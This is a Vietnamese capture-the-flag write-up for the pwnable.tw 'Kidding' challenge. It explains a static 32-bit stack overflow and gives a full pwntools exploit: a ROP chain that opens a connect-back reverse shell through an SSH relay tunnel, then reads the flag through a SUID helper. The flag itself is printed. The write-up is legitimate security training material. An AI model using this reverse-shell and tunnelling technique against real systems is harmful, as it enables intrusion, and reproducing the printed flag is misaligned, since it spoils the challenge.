+++
title = 'Pwnable.tw - Kidding'
date = 2026-09-22T08:16:50+07:00
draft = false
categories = ["pwn"]
series = ["Pwnable.tw"]
+++

## Kidding

`nc chall.pwnable.tw 10303`

Đề bài: *"Can you get a shell for me? Just kidding, it's unexploitable."*

### 1. Phân tích Binary

```js
pwndbg> checksec
File:       /home/lwd3c/Desktop/Pwn/pwnable.tw/Kidding/kidding
Arch:       i386-32-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x8048000)
Stripped:   No
```

Binary `statically linked`. `main` ở `0x804887c` chỉ có vài dòng:

```c
read(0, ebp-8, 0x64);
close(0); close(1); close(2);
return 0;
```

`read` 100 bytes vào buffer 8 bytes, offset tới saved EIP đo bằng `cyclic` là **12** (EIP crash `0x61616164`).

#### Trò đùa nằm ở đâu

Code execution thì dễ, nhưng **cả ba fd chuẩn đều bị đóng** trước khi `main` return. `execve("/bin/sh")` thành công cũng chỉ cho một shell không có input/output. Muốn tương tác thì phải tự tạo kênh: **reverse shell**.

Các hướng đã loại:

| Hướng | Lý do loại |
|---|---|
| shellcode qua `jmp esp` | NX bật, stack không exec |
| `mprotect` + shellcode | cần kênh nhập thứ hai và địa chỉ stack page-aligned, chưa có trước khi connect back |
| `execve` + `/dev/tty` | remote không có controlling tty, `open("/dev/tty")` fail |
| SROP | rt_sigframe i386 vượt quá 100 bytes, và không có lần read thứ hai trước khi có socket |

### 2. Khai thác

Chain: `socket` → `connect` → `read(stage2)` → pivot → `dup2` → `execve`.

Khó nhất là toàn bộ stage 1 phải lọt trong đúng một lần `read` 100 bytes = 25 dword, trong đó 3 dword đầu là buffer và saved EBP.

#### Trạng thái thanh ghi tại `ret`

Đo trong gdb tại `0x80488b6`:

```js
eax = 0
ecx = A          <- đầu buffer
esp = A + 12
ebp = payload[8:12]   (ta kiểm soát)
```

`ecx` trỏ đúng đầu buffer là mấu chốt, và `int 0x80` không phá `ecx`.

#### Ba chỗ tiết kiệm

1. **`ecx == A`**: `socketcall(SYS_SOCKET)` đọc mảng tham số `[2, 1, 0]` ngay từ `payload[0:12]` - chính 3 dword rác của buffer và saved EBP. Không cần mảng tham số trong `.bss`, socket chỉ tốn 5 dword.

2. **Gadget `read` ở `0x080520e6`**:
   ```asm
   mov eax,3 ; call ds:0x80ea9f0 ; cmp eax,-4095 ; ja err ; pop ebx ; ret
   ```
   Nó tự set `eax = 3`, nên lệnh read chỉ tốn `[gadget][ebx]` = 2 dword.

3. **`connect` syscall trực tiếp (362) với `addrlen = 128`**: kernel chấp nhận mọi `addrlen <= sizeof(sockaddr_storage)` cho `AF_INET`, và `edx` được giữ nguyên qua syscall. Nên `read(0, SA, 128)` ngay sau đó không cần set lại `edx`/`ecx` gì cả. Tiết kiệm trọn một cụm `pop edx; pop ecx; pop ebx`.

Tổng stage 1 = `socket(5) + sockaddr(7) + connect(7) + read(2) + pivot(1)` = 22 dword, vừa khít.

#### Gadget

```js
POP_EAX         = 0x080b8536   # pop eax ; ret
POP_EBX         = 0x080481c9   # pop ebx ; ret
INT80           = 0x0806f290   # int 0x80 ; ret
POP_EDX_ECX_EBX = 0x0806ecb0   # pop edx ; pop ecx ; pop ebx ; ret
POP_ECX_EBX     = 0x0806ecb1   # pop ecx ; pop ebx ; ret
GAD_STORE3      = 0x0804d86d   # mov [edx+0x14],ecx ; mov [edx+0xc],ebp ; mov [edx+0x18],eax ; ret
READ_GADGET     = 0x080520e6   # mov eax,3 ; call ds:0x80ea9f0 ; ... ; pop ebx ; ret
MOV_ESP_ECX     = 0x080b8772   # mov esp,ecx ; ret
SA              = 0x080eb100   # scratch trong .bss
```

Binary không có chuỗi `/bin/sh` và không có symbol `socket`/`connect`/`dup2`/`execve`, nên toàn bộ đi bằng `int 0x80` thuần.

#### Stage 2

Đọc vào từ chính socket connect-back:

```js
dup2(0,1) ; dup2(0,2) ; execve(SA+76, 0, 0) ; "/bin/sh\0"
```

#### Lấy flag

Shell chạy dưới user `kidding`. Flag `/home/flag/I_am_fl4g` mode `0400` của `flag:flag`, kèm helper SUID `/home/flag/get_flag`. Đọc source thì thấy nó nhận tối đa 30 bytes, yêu cầu `strcmp(buf, "./I_am_fl4g") == 0` rồi `fopen("./I_am_fl4g")` - tức là phải chạy với `CWD=/home/flag`:

```bash
cd /home/flag; printf "./I_am_fl4g\n" | ./get_flag
```

```bash
uid=1001(kidding) gid=1001(kidding)
where is your flag :Here is your flag: FLAG{Ar3_y0u_k1dd1ng_m3}
```

`FLAG: FLAG{Ar3_y0u_k1dd1ng_m3}`

```py
#!/usr/bin/env python3
# pwnable.tw "Kidding" - 32-bit static, NX, no PIE, no canary.
# Bug: read(0, ebp-8, 100) stack overflow -> EIP at offset 12; then close(0/1/2)
# so a plain execve("/bin/sh") has no I/O.  Solve = reverse shell (connect-back):
# socket -> connect -> read stage2 -> pivot -> dup2(0,1/2) -> execve("/bin/sh").
import sys, re, time, socket as _socket, subprocess
from pwn import *

context.binary = ELF('./kidding', checksec=False)
context.arch = 'i386'
context.log_level = 'info'

POP_EAX         = 0x080b8536   # pop eax ; ret
POP_EBX         = 0x080481c9   # pop ebx ; ret
INT80           = 0x0806f290   # int 0x80 ; ret
POP_EDX_ECX_EBX = 0x0806ecb0   # pop edx ; pop ecx ; pop ebx ; ret
POP_ECX_EBX     = 0x0806ecb1   # pop ecx ; pop ebx ; ret
GAD_STORE3      = 0x0804d86d   # mov [edx+0x14],ecx ; mov [edx+0xc],ebp ; mov [edx+0x18],eax ; ret
READ_GADGET     = 0x080520e6   # mov eax,3 ; call ds:0x80ea9f0 ; cmp eax,-4095 ; ja err ; pop ebx ; ret
MOV_ESP_ECX     = 0x080b8772   # mov esp,ecx ; ret

SA     = 0x080eb100            # writable scratch: sockaddr then stage2 buffer
SA_STR = SA + 76               # "/bin/sh" inside stage2

REMOTE_HOST, REMOTE_PORT = 'chall.pwnable.tw', 10303
LPORT = 4444

def _fam_ip(ip, port):
    return u32(p16(2) + p16(port, endian='big')), u32(_socket.inet_aton(ip))

def stage1(ip, port):
    fam, ipdw = _fam_ip(ip, port)
    r  = b''
    # socketcall(SYS_SOCKET=1): eax=102, ebx=1, ecx=buf (=inline [2,1,0] at offset 0..11)
    r += p32(POP_EAX) + p32(102) + p32(POP_EBX) + p32(1) + p32(INT80)
    # sockaddr -> .bss: [SA]=family|port, [SA+4]=ip
    r += p32(POP_EAX) + p32(ipdw)
    r += p32(POP_EDX_ECX_EBX) + p32(SA-0x14) + p32(fam) + p32(0)
    r += p32(GAD_STORE3)
    # connect(fd=0, &sa, 128): direct syscall 362; leaves edx=128 for the read
    r += p32(POP_EAX) + p32(362)
    r += p32(POP_EDX_ECX_EBX) + p32(128) + p32(SA) + p32(0) + p32(INT80)
    # read(0, SA, 128): ebx=0, ecx=SA, edx=128 already correct; gadget sets eax=3
    r += p32(READ_GADGET) + p32(0)
    # pivot to stage2
    r += p32(MOV_ESP_ECX)
    return r

def stage2():
    r  = b''
    r += p32(POP_EAX) + p32(63) + p32(POP_ECX_EBX) + p32(1) + p32(0) + p32(INT80)  # dup2(0,1)
    r += p32(POP_EAX) + p32(63) + p32(POP_ECX_EBX) + p32(2) + p32(0) + p32(INT80)  # dup2(0,2)
    r += p32(POP_EAX) + p32(11) + p32(POP_EDX_ECX_EBX) + p32(0) + p32(0) + p32(SA_STR) + p32(INT80)
    assert len(r) == 76
    return r + b'/bin/sh\x00'

def payload(ip, port):
    p = p32(2) + p32(1) + p32(0) + stage1(ip, port)   # 0..11 = socket args, 12.. = chain
    assert len(p) == 100, len(p)
    return p

def pwn(host_ip, port, run):
    srv = listen(port, bindaddr='127.0.0.1')
    io = run()
    io.send(payload(host_ip, port))
    cb = srv.wait_for_connection()
    cb.send(stage2())
    return cb

def start_tunnel(lport, host):
    ssh = subprocess.Popen(
        ['ssh','-o','StrictHostKeyChecking=no','-o','ServerAliveInterval=5',
         '-p','443','-R0:localhost:%d' % lport, host],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    t0 = time.time()
    while time.time() - t0 < 25:
        line = ssh.stdout.readline()
        if not line:
            break
        m = re.search(r'tcp://([^:]+):(\d+)', line)
        if m:
            return m.group(1), int(m.group(2))
    raise RuntimeError('no pinggy tunnel')

if __name__ == '__main__':
    if args.REMOTE:
        host, port = start_tunnel(LPORT, 'tcp@a.pinggy.io')
        ip = _socket.gethostbyname(host)
        log.success('relay %s:%d (%s)' % (host, port, ip))
        cb = pwn(ip, port, lambda: remote(REMOTE_HOST, REMOTE_PORT))
        cb.sendline(b'id')
        cb.sendline(b'cd /home/flag; printf "./I_am_fl4g\\n" | ./get_flag')
        time.sleep(1.5)
        try:
            print(cb.recv(timeout=3).decode('latin1'))
        except Exception:
            pass
    else:
        cb = pwn('127.0.0.1', LPORT, lambda: process('./kidding'))
    log.success('reverse shell established')
    cb.interactive()
```
